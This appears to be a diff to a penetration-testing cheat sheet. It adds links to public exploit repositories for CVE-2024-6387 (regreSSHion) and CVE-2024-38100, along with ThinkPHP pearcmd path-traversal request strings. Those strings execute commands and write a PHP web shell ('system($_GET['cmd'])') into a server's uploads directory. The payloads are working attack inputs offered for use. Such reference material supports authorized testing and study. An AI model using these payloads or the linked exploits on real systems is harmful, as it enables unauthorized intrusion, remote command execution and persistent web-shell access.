@@ -162,7 +162,9 @@
 | CVE-2024-0582 | Ubuntu Linux Kernel io_uring LPE | https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582 |
 | CVE-2024-1086 | Use-After-Free Linux Kernel Netfilter nf_tables LPE | https://github.com/Notselwyn/CVE-2024-1086 |
 | CVE-2024-4577 | PHP-CGI Argument Injection Vulnerability RCE | https://github.com/watchtowrlabs/CVE-2024-4577 |
-| CVE-2024-6387 | OpenSSH regreSSHion RCE | https://github.com/zgzhang/cve-2024-6387-poc |
+| CVE-2024-6387 | OpenSSH regreSSHion RCE (1) | https://github.com/zgzhang/cve-2024-6387-poc |
+| CVE-2024-6387 | OpenSSH regreSSHion RCE PoC (2) | https://github.com/xonoxitron/regreSSHion |
+| CVE-2024-6387 | OpenSSH regreSSHion RCE PoC (3) | https://github.com/l0n3m4n/CVE-2024-6387 |
 | CVE-2024-20656 | Visual Studio VSStandardCollectorService150 Service LPE | https://github.com/Wh04m1001/CVE-2024-20656 |
 | CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (1) | https://github.com/duy-31/CVE-2024-21413 |
 | CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (2) | https://github.com/CMNatic/CVE-2024-21413 |
@@ -173,6 +175,7 @@
 | CVE-2024-29849 | Veeam Backup Enterprise Manager Authentication Bypass | https://github.com/sinsinology/CVE-2024-29849 |
 | CVE-2024-30088 | Microsoft Windows LPE | https://github.com/tykawaii98/CVE-2024-30088 |
 | CVE-2024-32002 | Git: git clone RCE | https://github.com/amalmurali47/git_rce |
+| CVE-2024-38100 | Leaked Wallpaper LPE | https://github.com/MzHmO/LeakedWallpaper |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | GSM Linux Kernel LPE (1) | https://github.com/jmpe4x/GSM_Linux_Kernel_LPE_Nday_Exploit |
@@ -1978,6 +1981,11 @@ $ cc -Wall -std=c99 -O2 shocker.c -static
 
 ## ThinkPHP < 6.0.14 Remote Code Execution RCE
 
+> https://github.com/Mr-xn/thinkphp_lang_RCE
+
 ```c
 /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=whoami
+/?page=/usr/local/lib/php/pearcmd&whoami
+/?page=/usr/local/lib/php/pearcmd&/<?=system($_GET['cmd']);?>+/var/www/html/uploads/<FILE>.php
+/?+config-create+/&page=/usr/local/lib/php/pearcmd&/<?=system($_GET['cmd']);?>+/var/www/html/uploads/<FILE>.php 
 ```
